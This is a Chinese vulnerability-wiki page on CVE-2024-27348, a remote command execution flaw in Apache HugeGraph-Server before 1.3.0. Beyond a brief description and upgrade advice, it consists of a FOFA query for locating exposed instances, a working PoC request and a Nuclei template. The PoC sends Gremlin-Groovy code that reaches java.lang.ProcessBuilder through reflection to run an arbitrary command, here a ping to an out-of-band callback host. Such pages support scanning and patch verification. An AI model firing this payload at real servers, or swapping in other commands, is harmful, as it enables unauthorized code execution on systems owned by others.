<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache/Apache-HugeGraph-Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2024-27348%29/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache HugeGraph Server远程代码执行漏洞(CVE 2024 27348) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache-HugeGraph-Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2024-27348)", url: "#_top", children: [
          ]},
          {title: "fofa", url: "#fofa", children: [
          ]},
          {title: "poc", url: "#poc", children: [
          ]},
          {title: "nuclei", url: "#nuclei", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache-Kafka%E7%9A%84UI%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2023-52251/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache-Kafka%E7%9A%84UI%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2023-52251/" class="btn btn-xs btn-link">
        Apache Kafka的UI中的远程代码执行CVE 2023 52251
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache-HertzBeat%E5%BC%80%E6%BA%90%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache-HertzBeat%E5%BC%80%E6%BA%90%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apache-HertzBeat开源实时监控系统存在默认口令漏洞
      </a>
    </div>
    
  </div>

    

    <h2 id="apache-hugegraph-servercve-2024-27348">Apache-HugeGraph-Server远程代码执行漏洞(CVE-2024-27348)<a class="headerlink" href="#apache-hugegraph-servercve-2024-27348" title="Permanent link">&para;</a></h2>
<p>Apache HugeGraph-Server 中的 RCE-远程命令执行漏洞。此问题影响 Apache HugeGraph-Server：Java8 和 Java11 中 1.3.0 之前的 1.0.0 建议用户升级到 Java11 版本 1.3.0 并启用身份验证系统，这解决了这个问题。</p>
<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>app=&quot;HugeGraph-Studio&quot;
</code></pre></div>
<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>POST /gremlin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{&quot;gremlin&quot;: &quot;Thread thread = Thread.currentThread();Class clz = Class.forName(\&quot;java.lang.Thread\&quot;);java.lang.reflect.Field field = clz.getDeclaredField(\&quot;name\&quot;);field.setAccessible(true);field.set(thread, \&quot;SL7\&quot;);Class processBuilderClass = Class.forName(\&quot;java.lang.ProcessBuilder\&quot;);java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\&quot;ping\&quot;, \&quot;{{interactsh-url}}\&quot;);Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\&quot;start\&quot;);startMethod.invoke(processBuilderInstance);&quot;, &quot;bindings&quot;: {}, &quot;language&quot;: &quot;gremlin-groovy&quot;, &quot;aliases&quot;: {}}
</code></pre></div>
<h2 id="nuclei">nuclei<a class="headerlink" href="#nuclei" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>id: CVE-2024-27348

info:
  name: Apache HugeGraph-Server - Remote Command Execution
  author: DhiyaneshDK
  severity: high
  description: |
    Apache HugeGraph-Server is an open-source graph database that provides a scalable and high-performance solution for managing and analyzing large-scale graph data. It is commonly used in Java8 and Java11 environments. However, versions prior to 1.3.0 are vulnerable to a remote command execution (RCE) vulnerability in the gremlin component.
  reference:
    - http://www.openwall.com/lists/oss-security/2024/04/22/3
    - https://hugegraph.apache.org/docs/config/config-authentication/#configure-user-authentication
    - https://lists.apache.org/thread/nx6g6htyhpgtzsocybm242781o8w5kq9
    - https://github.com/Zeyad-Azima/CVE-2024-27348
    - https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-27348
    - https://nvd.nist.gov/vuln/detail/CVE-2024-27348
  classification:
    cve-id: CVE-2024-27348
    cwe-id: CWE-77
    epss-score: 0.00045
    epss-percentile: 0.15047
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:&quot;HugeGraph&quot;
    fofa-query: title=&quot;HugeGraph&quot;
  tags: cve,cve2024,hugegraph,rce,apache

http:
  - raw:
      - |
        POST /gremlin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        {&quot;gremlin&quot;: &quot;Thread thread = Thread.currentThread();Class clz = Class.forName(\&quot;java.lang.Thread\&quot;);java.lang.reflect.Field field = clz.getDeclaredField(\&quot;name\&quot;);field.setAccessible(true);field.set(thread, \&quot;SL7\&quot;);Class processBuilderClass = Class.forName(\&quot;java.lang.ProcessBuilder\&quot;);java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\&quot;ping\&quot;, \&quot;{{interactsh-url}}\&quot;);Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\&quot;start\&quot;);startMethod.invoke(processBuilderInstance);&quot;, &quot;bindings&quot;: {}, &quot;language&quot;: &quot;gremlin-groovy&quot;, &quot;aliases&quot;: {}}
    matchers:
      - type: dsl
        dsl:
          - &#39;contains(interactsh_protocol, &quot;dns&quot;)&#39;
          - &#39;contains(header, &quot;application/json&quot;)&#39;
          - &#39;contains(body, &quot;inputStream\&quot;:&quot;)&#39;
        condition: and
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache-Kafka%E7%9A%84UI%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2023-52251/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache-Kafka%E7%9A%84UI%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2023-52251/" class="btn btn-xs btn-link">
        Apache Kafka的UI中的远程代码执行CVE 2023 52251
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache-HertzBeat%E5%BC%80%E6%BA%90%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache-HertzBeat%E5%BC%80%E6%BA%90%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apache-HertzBeat开源实时监控系统存在默认口令漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>